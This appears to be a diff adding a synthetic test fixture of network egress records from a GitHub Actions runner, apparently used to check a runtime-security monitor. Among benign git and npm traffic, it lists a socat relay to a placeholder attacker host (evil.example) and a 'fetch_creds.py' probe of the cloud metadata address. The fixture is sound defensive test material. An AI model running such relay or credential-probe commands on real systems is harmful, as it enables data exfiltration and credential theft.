@@ -1,0 +1,188 @@
+{
+  "$comment": "Synthetic v6.4.0 contract fixture — covers the record states no real capture exercises: bare-IP egress, ordinary GitHub/npm destinations, same-ancestry/different-PID, empty proc_trees, exact IMDS addresses, loopback:53 resolver vs loopback:8080 proxy, address-like remote names, multiple + record-truncated names, and a neutral systemd lineage.",
+  "uuid": "0f5b2a1c-9d4e-4b7a-8c3d-2e1f6a7b8c9d",
+  "timestamp": "2026-07-08T05:35:56.123456789Z",
+  "metadata": { "version": "0.2.0" },
+  "scenarios": {
+    "github": {
+      "scenario_type": "github",
+      "workflow": "Synthetic Contract",
+      "job": "edge-cases",
+      "repository": "garnet-org/runtime-review-testbed",
+      "run_id": "31000000001",
+      "sha": "aa11bb22cc33dd44ee55ff6677889900aabbccdd",
+      "server_url": "https://github.com"
+    }
+  },
+  "network": {
+    "egress": {
+      "peers": [
+        {
+          "protocol": "tcp",
+          "remote_address": "203.0.113.7",
+          "remote_names": [],
+          "remote_ports": ["8443"],
+          "proc_trees": [
+            {
+              "pid": 4101,
+              "process": "curl",
+              "executable": "/usr/bin/curl",
+              "arguments": "curl https://203.0.113.7:8443/",
+              "github_step": "4. Bare IP fetch",
+              "ancestry": ["systemd", "Runner.Worker", "bash", "curl"]
+            }
+          ]
+        },
+        {
+          "protocol": "tcp",
+          "remote_address": "140.82.116.3",
+          "remote_names": ["github.com"],
+          "remote_ports": ["443"],
+          "proc_trees": [
+            {
+              "pid": 4102,
+              "process": "git",
+              "executable": "/usr/bin/git",
+              "arguments": "git fetch origin",
+              "github_step": "1. Checkout",
+              "ancestry": ["systemd", "Runner.Worker", "bash", "git"]
+            }
+          ]
+        },
+        {
+          "protocol": "tcp",
+          "remote_address": "140.82.116.6",
+          "remote_names": ["api.github.com"],
+          "remote_ports": ["443"],
+          "proc_trees": [
+            {
+              "pid": 4103,
+              "process": "node",
+              "executable": "/usr/bin/node",
+              "arguments": "node script.js",
+              "github_step": "2. API call",
+              "ancestry": ["systemd", "Runner.Worker", "bash", "node"]
+            }
+          ]
+        },
+        {
+          "protocol": "tcp",
+          "remote_address": "104.16.24.34",
+          "remote_names": ["registry.npmjs.org"],
+          "remote_ports": ["443"],
+          "proc_trees": [
+            {
+              "pid": 4104,
+              "process": "node",
+              "executable": "/usr/bin/node",
+              "arguments": "npm install",
+              "github_step": "3. Install dependencies",
+              "ancestry": ["systemd", "Runner.Worker", "bash", "node"]
+            },
+            {
+              "pid": 4105,
+              "process": "node",
+              "executable": "/usr/bin/node",
+              "arguments": "npm install",
+              "github_step": "3. Install dependencies",
+              "ancestry": ["systemd", "Runner.Worker", "bash", "node"]
+            }
+          ]
+        },
+        {
+          "protocol": "tcp",
+          "remote_address": "198.51.100.44",
+          "remote_names": ["no-lineage.example"],
+          "remote_ports": ["443"],
+          "proc_trees": []
+        },
+        {
+          "protocol": "tcp",
+          "remote_address": "169.254.169.254",
+          "remote_names": [],
+          "remote_ports": ["80"],
+          "proc_trees": [
+            {
+              "pid": 4106,
+              "process": "python3",
+              "executable": "/usr/bin/python3",
+              "arguments": "python3 fetch_creds.py",
+              "github_step": "5. Metadata probe",
+              "ancestry": ["systemd", "Runner.Worker", "bash", "python3"]
+            }
+          ]
+        },
+        {
+          "protocol": "udp",
+          "remote_address": "127.0.0.53",
+          "remote_names": ["localhost"],
+          "remote_ports": ["53 (dns)"],
+          "proc_trees": [
+            {
+              "pid": 4107,
+              "process": "node",
+              "executable": "/usr/bin/node",
+              "arguments": "node script.js",
+              "github_step": "3. Install dependencies",
+              "ancestry": ["systemd", "Runner.Worker", "bash", "node"]
+            }
+          ]
+        },
+        {
+          "protocol": "tcp",
+          "remote_address": "127.0.0.1",
+          "remote_names": [],
+          "remote_ports": ["8080"],
+          "proc_trees": [
+            {
+              "pid": 4108,
+              "process": "socat",
+              "executable": "/usr/bin/socat",
+              "arguments": "socat TCP-LISTEN:8080 TCP:evil.example:443",
+              "github_step": "6. Local proxy",
+              "ancestry": ["systemd", "Runner.Worker", "bash", "socat"]
+            }
+          ]
+        },
+        {
+          "protocol": "tcp",
+          "remote_address": "140.82.113.23",
+          "remote_names": ["140.82.113.23"],
+          "remote_ports": ["443"],
+          "proc_trees": [
+            {
+              "pid": 4109,
+              "process": "Runner.Worker",
+              "executable": "/home/runner/runners/bin/Runner.Worker",
+              "arguments": "Runner.Worker spawnclient",
+              "github_step": "",
+              "ancestry": ["systemd", "hosted-compute-agent", "Runner.Listener", "Runner.Worker"]
+            }
+          ]
+        },
+        {
+          "protocol": "tcp",
+          "remote_address": "140.82.112.24",
+          "remote_names": [
+            "glb-2a3c35-public-internal.githubapp.com",
+            "hosted-compute-watchdog-prod-iad-02.githubapp"
+          ],
+          "remote_ports": ["443"],
+          "proc_trees": [
+            {
+              "pid": 4110,
+              "process": "systemd",
+              "executable": "/usr/lib/systemd/systemd",
+              "arguments": "/sbin/init",
+              "github_step": "",
+              "ancestry": ["systemd"]
+            }
+          ]
+        }
+      ]
+    }
+  },
+  "telemetry": {
+    "network": { "egress": { "total_domains": 99, "total_connections": 999 } }
+  }
+}
